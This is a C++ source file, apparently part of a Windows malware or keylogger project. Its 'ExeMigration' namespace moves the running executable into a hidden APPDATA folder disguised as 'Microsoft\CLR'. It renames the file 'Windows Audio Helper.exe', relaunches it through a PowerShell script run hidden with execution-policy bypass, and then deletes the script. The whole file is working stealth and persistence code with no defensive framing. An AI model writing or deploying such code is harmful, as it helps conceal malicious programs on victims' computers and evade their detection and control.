#include <fstream>
#include <string>
#include <windows.h>
#include "IO.h"
#include "Timer.h"

namespace ExeMigration
{

    const std::string migrationScriptName = "mv.ps1";

    bool hasEnding(std::string const &fullString, std::string const &ending)
    {
        if (fullString.length() >= ending.length())
            return (0 == fullString.compare(fullString.length() - ending.length(), ending.length(), ending));
        else
            return false;
    }

    bool CheckIfSafe()
    {
        std::string curPath = IO::GetCurDir();
        std::string appdataDir = getenv("APPDATA");
        std::string appdataHidingDir = appdataDir + "\\Microsoft\\CLR";
        if (curPath == appdataHidingDir)
        {
            return true;
        }
        return false;
    }

    std::string GetSafePath( bool useSeperator )
    {
        //first check appdata folder
        std::string appdataDir = getenv("APPDATA");
        std::string micrAppdataDir = appdataDir + "\\Microsoft";
        if (IO::CheckDirExists(micrAppdataDir))
        {
            IO::MakeOneDirectory(micrAppdataDir + "\\CLR");
            return micrAppdataDir + "\\CLR" + (useSeperator ? "\\" : "");
        }
        return "";
    }

    bool CreateMigrationScript()
    {
        std::string thisFilePath = IO::GetThisFilePath();
        std::string safePath = GetSafePath(false);
        std::string newFilePath = safePath  + "\\Windows Audio Helper.exe";
        const std::string scriptText = "Start-Sleep  -Milliseconds 100;\nmove \"" + thisFilePath + "\"  \"" + newFilePath + "\"\nStart-Sleep  -Milliseconds 500;\n" + "[System.Diagnostics.Process]::Start(\"" + newFilePath + "\")\n";
        try
        {
            std::ofstream scriptOutFile(migrationScriptName);
            scriptOutFile << scriptText.c_str() << std::endl;

            scriptOutFile.close();
            
            std::ofstream locOutStream(safePath + "\\oldloc.txt");
            std::string scriptPath = IO::GetCurDir() + "\\" + migrationScriptName; 
            locOutStream << scriptPath.c_str();
            locOutStream.close();
        }
        catch (std::exception &e)
        {
            return false;
        }
        return true;
    }

    void DeleteMigrationScript()
    {
        std::ifstream inFile(IO::GetCurDir() + "\\oldloc.txt");
        
        try
        {
            if (inFile)
            {
                std::string oldfilePath;
                inFile >> oldfilePath;
                inFile.close();
                IO::DeleteFile(oldfilePath);
                IO::DeleteFile(IO::GetCurDir() + "\\oldloc.txt");
            }
        }
        catch(const std::exception& e){}
        
    }

    bool MigrateToSafeDir()
    {
        
        if (!CreateMigrationScript())
        {
            return false;
        }
        try 
        {
            std::string param = "-ExecutionPolicy Bypass -File \"" + IO::GetCurDir() + "\\" + migrationScriptName + "\"";

            SHELLEXECUTEINFO ShExecInfo = {0};
            ShExecInfo.cbSize = sizeof(SHELLEXECUTEINFO);
            ShExecInfo.fMask = SEE_MASK_NOCLOSEPROCESS;
            ShExecInfo.hwnd = NULL;
            ShExecInfo.lpVerb = "open";
            ShExecInfo.lpFile = "powershell";
            ShExecInfo.lpParameters = param.c_str();
            ShExecInfo.lpDirectory = NULL;
            ShExecInfo.hInstApp = NULL;
            ShExecInfo.nShow = SW_HIDE;
  
            ShellExecuteEx(&ShExecInfo);
        } 
        catch (std::exception &e) 
        {
            return false;
        }
        return true;

    }

} // ExeMigration
